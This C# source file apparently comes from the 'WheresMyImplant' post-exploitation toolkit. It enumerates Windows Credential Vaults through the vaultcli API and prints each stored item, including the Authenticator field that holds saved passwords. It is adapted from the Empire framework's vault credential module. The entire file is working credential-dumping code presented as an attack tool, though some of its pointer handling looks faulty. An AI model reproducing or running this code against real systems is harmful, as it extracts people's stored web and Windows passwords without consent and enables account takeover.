using System;
using System.Runtime.InteropServices;
using System.Runtime.InteropServices.ComTypes;

namespace WheresMyImplant
{
    class VaultCLI
    {
        private delegate void GetItem(IntPtr hVault, IntPtr hItem, Int32 increment);
        private GetItem getItem;

        public VaultCLI()
        {
            Double version = Misc.GetOSVersion();
            Console.WriteLine("[*] Detected Windows {0}", version);
            if (6.1 < version)
            {
                getItem = GetItem8;
            }
            else
            {
                getItem = GetItem7;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        public void EnumerateVaults()
        {
            Int32 dwVaultCount;
            IntPtr lpVaultGuids;
            vaultcli.VaultEnumerateVaults(0, out dwVaultCount, out lpVaultGuids);
            Console.WriteLine("[+] {0} Vaults Enumerated\n", dwVaultCount);
           
            IntPtr lpVault;
            for (Int32 i = 0; i < dwVaultCount; i++)
            {
                lpVault = new IntPtr(lpVaultGuids.ToInt32() + i * Marshal.SizeOf(typeof(Guid)));
                Guid guid = (Guid)Marshal.PtrToStructure(lpVault, typeof(Guid));
                Console.WriteLine("{0,-20} {1,-20}", "Vault Type", GuidToString(guid));

                IntPtr hVault;
                vaultcli.VaultOpenVault(ref guid, 0, out hVault);
                EnumerateItems(hVault);
                Console.WriteLine("");
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        //
        ////////////////////////////////////////////////////////////////////////////////
        private void EnumerateItems(IntPtr hVault)
        {
            Int32 dwVaultItems;
            IntPtr hItem;
            vaultcli.VaultEnumerateItems(hVault, 0, out dwVaultItems, out hItem);
            Console.WriteLine("{0,-20} {1,-20}", "Vault Items", dwVaultItems);
            for (Int32 j = 0; j < dwVaultItems; j++)
            {
                getItem(hVault, hItem, j);
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Windows 7 Only
        ////////////////////////////////////////////////////////////////////////////////
        private static void GetItem7(IntPtr hVault, IntPtr hItem, Int32 count)
        {
            IntPtr lpVault = new IntPtr(hItem.ToInt32() + count * Marshal.SizeOf(typeof(Structs._VAULT_ITEM_7)));
            Structs._VAULT_ITEM_7 vaultItem = (Structs._VAULT_ITEM_7)Marshal.PtrToStructure(lpVault, typeof(Structs._VAULT_ITEM_7));

            IntPtr lpVaultItem;
            vaultcli.VaultGetItem7(
                hVault, 
                ref vaultItem.SchemaId, 
                vaultItem.Resource, 
                vaultItem.Identity, 
                IntPtr.Zero, 
                0, 
                out lpVaultItem
            );

            Structs._VAULT_ITEM_7 passItem = (Structs._VAULT_ITEM_7)Marshal.PtrToStructure(lpVault, typeof(Structs._VAULT_ITEM_7));
            GetElementData("FriendlyName", passItem.FriendlyName);
            GetElementData("Resource", passItem.Resource);
            GetElementData("Identity", passItem.Identity);
            GetElementData("Authenticator", passItem.Authenticator);
            Console.WriteLine("{0,-20} {1,-20}", "LastWritten", DateTime.FromFileTime(passItem.LastWritten));
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Windows 8+ Only
        ////////////////////////////////////////////////////////////////////////////////
        private static void GetItem8(IntPtr hVault, IntPtr hItem, Int32 count)
        {
            IntPtr lpVault = new IntPtr(hItem.ToInt32() + count * Marshal.SizeOf(typeof(Structs._VAULT_ITEM_8)));
            Structs._VAULT_ITEM_8 vaultItem = (Structs._VAULT_ITEM_8)Marshal.PtrToStructure(lpVault, typeof(Structs._VAULT_ITEM_8));

            IntPtr lpVaultItem;
            vaultcli.VaultGetItem8(
                hVault,
                ref vaultItem.SchemaId,
                vaultItem.Resource,
                vaultItem.Identity,
                vaultItem.PackageSid, 
                IntPtr.Zero,
                0,
                out lpVaultItem
            );

            Structs._VAULT_ITEM_8 passItem = (Structs._VAULT_ITEM_8)Marshal.PtrToStructure(lpVault, typeof(Structs._VAULT_ITEM_8));
            GetElementData("FriendlyName", passItem.FriendlyName);
            GetElementData("Resource", passItem.Resource);
            GetElementData("Identity", passItem.Identity);
            GetElementData("PackageSid", passItem.PackageSid);
            GetElementData("Authenticator", passItem.Authenticator);
            Console.WriteLine("{0,-20} {1,-20}", "LastWritten", DateTime.FromFileTime(passItem.LastWritten));
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reference: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Get-VaultCredential.ps1
        ////////////////////////////////////////////////////////////////////////////////
        private static string GuidToString(Guid guid)
        {
            switch (guid.ToString().ToUpper())
            {
                case "2F1A6504-0641-44CF-8BB5-3612D865F2E5":
                    return "Windows Secure Note";
                case "3CCD5499-87A8-4B10-A215-608888DD3B55":
                    return "Windows Web Password Credential";
                case "154E23D0-C644-4E6F-8CE6-5069272F999F":
                    return "Windows Credential Picker Protector";
                case "4BF4C442-9B8A-41A0-B380-DD4A704DDB28":
                    return "Web Credentials";
                case "77BC582B-F0A6-4E15-4E80-61736B6F3B29":
                    return "Windows Credentials";
                case "E69D7838-91B5-4FC9-89D5-230D4D4CC2BC":
                    return "Windows Domain Certificate Credential";
                case "3E0E35BE-1B77-43E7-B873-AED901B6275B":
                    return "Windows Domain Password Credential";
                case "3C886FF3-2669-4AA2-A8FB-3F6759A77548":
                    return "Windows Extended Credential";
                case "00000000-0000-0000-0000-000000000000":
                    return String.Empty;
                default:
                    return String.Empty;
            }
        }

        ////////////////////////////////////////////////////////////////////////////////
        // Reference: https://github.com/EmpireProject/Empire/blob/master/data/module_source/credentials/Get-VaultCredential.ps1
        ////////////////////////////////////////////////////////////////////////////////
        private static void GetElementData(String name, IntPtr lpInput)
        {
            if (IntPtr.Zero == lpInput)
            {
                Console.WriteLine("{0,-20} {1,-20}", name, "");
                return;
            }

            Structs._VAULT_ITEM_DATA data = (Structs._VAULT_ITEM_DATA)Marshal.PtrToStructure(lpInput, typeof(Structs._VAULT_ITEM_DATA));
            IntPtr lpData = new IntPtr(lpInput.ToInt64() + Marshal.SizeOf(typeof(Structs._VAULT_ITEM_DATA)));
            switch (data.Type)
            {
                case Enums._VAULT_ELEMENT_TYPE.Type_Boolean:
                    Console.WriteLine("{0,-20} {1,-20}", name, Convert.ToBoolean(Marshal.ReadByte(lpData)));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_Short:
                    Console.WriteLine("{0,-20} {1,-20}", name, Marshal.ReadInt16(lpData));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_UnsignedShort:
                    Console.WriteLine("{0,-20} {1,-20}", name, Marshal.ReadInt16(lpData));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_Integer:
                    Console.WriteLine("{0,-20} {1,-20}", name, Marshal.ReadInt32(lpData));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_UnsignedInteger:
                    Console.WriteLine("{0,-20} {1,-20}", name, Marshal.ReadInt32(lpData));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_Double:
                    Console.WriteLine("{0,-20} {1,-20}", name, (double)Marshal.PtrToStructure(lpData, typeof(double)));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_Guid:
                    Console.WriteLine("{0,-20} {1,-20}", name, (Guid)Marshal.PtrToStructure(lpData, typeof(Guid)));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_String:
                    Console.WriteLine("{0,-20} {1,-20}", name, Marshal.PtrToStringUni(Marshal.ReadIntPtr(lpData)));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_ByteArray:
                    Console.WriteLine("{0,-20} {1,-20}", name, (Byte[])Marshal.PtrToStructure(lpData, typeof(Byte[])));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_TimeStamp:
                    Console.WriteLine("{0,-20} {1,-20}", name, (System.Runtime.InteropServices.ComTypes.FILETIME)Marshal.PtrToStructure(lpData, typeof(System.Runtime.InteropServices.ComTypes.FILETIME)));
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_ProtectedArray:
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_Attribute:
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_Sid:
                    Console.WriteLine("{0,-20} {1,-20}", name, (new System.Security.Principal.SecurityIdentifier(Marshal.ReadIntPtr(lpData))).Value);
                    break;
                case Enums._VAULT_ELEMENT_TYPE.Type_Max:
                    break;
                default:
                    break;
            }
            
        }
    }
}